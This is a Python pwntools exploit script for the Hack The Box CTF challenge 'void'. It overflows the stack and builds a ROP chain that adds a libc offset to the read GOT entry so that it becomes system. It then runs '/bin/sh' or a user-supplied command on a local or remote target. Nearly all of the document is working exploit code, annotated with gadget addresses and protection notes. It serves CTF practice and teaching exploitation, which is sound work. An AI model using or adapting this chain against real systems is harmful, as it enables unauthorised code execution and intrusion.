################################################################################
# exploit.py
#   Chapter:02
#   Binary: HTB CA2023 "void"
#   Source: --
#   Goal:   Spwan a shell without using ret2dlresolve!
#   https://app.hackthebox.com/challenges/462
################################################################################
from pwn import *

################################################################################
#  writeMemory(addr,value,r)
#       Writes value into addr. It can read up to 0xc8 bytes, Returns to
#       main to continue the ROP-chain attack.
################################################################################
def writeMemory(addr,value,r):

    rop =   b''
    rop +=  p64(pop_rdi)
    rop +=  p64(0x0)
    rop +=  p64(pop_rsi_r15)
    rop +=  p64(addr)                           # rsi
    rop +=  p64(0x0)                            # r15
    # read(0,addr,0xc8);
    rop +=  p64(binary.symbols["plt.read"])
    rop +=  p64(binary.symbols["main"])

    # We send the ROP-chain:
    warning("> Writting %s (%s) at 0x%02x" % (value,value[::-1].hex(),addr))
    r.send(padding + p64(RBP) + rop)
    # And now the value we want at addr:
    r.send(value)

################################################################################
# ropAdd(addr,value)
#   It adds "value" to the address "addr". If the value is greater than 0xff,
#   it adds the carry to the next byte in the address, so it's a neat solution
#   to overwrite read() with write() for this version of glibc! Moreover, if
#   we add the same number but in its negative form, we restore the previous
#   value!
#  Using r2, we find this ROP-chain:
#  [0x00401122]> /Rq~ebx
#  0x00401101: inc esi; add eax, 0x2f27; add dword [rbp - 0x3d], ebx; 
#              nop dword [rax + rax]; ret;
#   So because we know which version of libc6 the server is running, we can
#   compute how far system is from read (in its negative form):
#       gefâž¤  p system - read
#           $2 = 0xfffffffffff596d0
#   Because we can only ADD, we will ADD this negative offset to read()
#   so it will become system right away
################################################################################
def ropAdd(addr,value):

    rop =   b''
    rop +=  p64(ret2csu_pop)        # pop rbx;rbp;r12;r13;r14;r15
    rop +=  p64(value)              # rbx = value
    rop +=  p64(addr+0x3d)          # rbp = addr+0x3d
    for i in range(0,4):
        rop +=  p64(0x0)            # r12,r13,r14,r15

    #0x00401108      015dc3         add dword [rbp - 0x3d], ebx
    #0x0040110b      0f1f440000     nop dword [rax + rax]
    #0x00401110      c3             ret
    rop +=  p64(0x00401108)         # Sets addr to *addr+=value

    warning("+ ropAdd():\t%d bytes " % len(rop))

    return rop

################################################################################
#   ropLeakData():
#       Constructs and returns a classic ROP-chain to leak address "addr"
#       It uses write(1,addr,rdx).
################################################################################
def ropLeakData(addr):

    # At this point, read() -> write().
    rop =   b''
    rop +=  p64(pop_rdi)
    rop +=  p64(0x1)                        # stdout
    rop +=  p64(pop_rsi_r15)                
    rop +=  p64(addr)                       # We know its write()!
    rop +=  p64(0x0)
    rop +=  p64(binary.symbols["plt.read"]) # write(1,write@got,rxd)

    warning("+ ropLeakData():\t%d bytes " % len(rop))

    return rop

def ropShell():

    rop =   b''
    rop +=  p64(pop_rdi)
    rop +=  p64(command_addr)
    rop +=  p64(ret)
    rop +=  p64(binary.symbols["plt.read"])

    return rop

# Binary protections:
# checksec --file void
#    Arch:     amd64-64-little
#    RELRO:    Full RELRO               We cannot overwrite .got
#    Stack:    No canary found          We can smash the stack as we please
#    NX:       NX enabled               We need ROP (stack is non-executable)
#    PIE:      No PIE (0x400000)        We don't need a memory leak
vuln    =   "./void"
binary  =   ELF(vuln)

# We control EIP after padding + RBP:
padding =   b'A'*64
# A fake RBP value:
RBP     =   0x0

if args.BSS:
    command_addr    =   binary.bss(int(args.BSS,16))
else:
    command_addr    =   binary.bss(0x300)

# Using ropper, we find the following ROP-gadgets we will need:
# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
ret2csu_pop  =   0x004011b2
# pop rdi;ret
pop_rdi      =   0x04011bb
# pop rsi;pop r15;ret
pop_rsi_r15  =   0x04011b9
# ret
ret          =   0x0401016

# Offsets from system, execve (negative values!):
system_offt =   0xfffffffffff596d0

# It runs the command passed as an argument or it opens a shell instead:
if args.CMD != "":
    command =   args.CMD.encode('ascii')
    command +=  b'\x00'
else:
    command =   b'/bin/sh\x00'

# Are we dealing with the live instance or a local process?
if args.REMOTE:
    r = remote(args.TARGET.split(':')[0],int(args.TARGET.split(':')[1]))
else:
    r   =   process(binary.path)
# We write the command into the .bss section:
warning("Writting command %s into address 0x%02x" % (command,command_addr))
writeMemory(command_addr,command,r)

# Our payload is very simple; we just add the negative number to got@read for
# system offset so that got@read becomes system right away; then we set RDI
# to our command and call system() to gain a shell:
input("GDB")
payload = padding \
         + p64(RBP) \
         + ropAdd(binary.symbols["got.read"],system_offt) \
         + ropShell()
warning("Payload is: %d" % len(payload))
r.send(payload)
if args.CMD != "":
    info("Receiving command output now...")
    warning(r.recvall().decode('ascii'))
else:
    r.clean()
    r.interactive()
r.close()
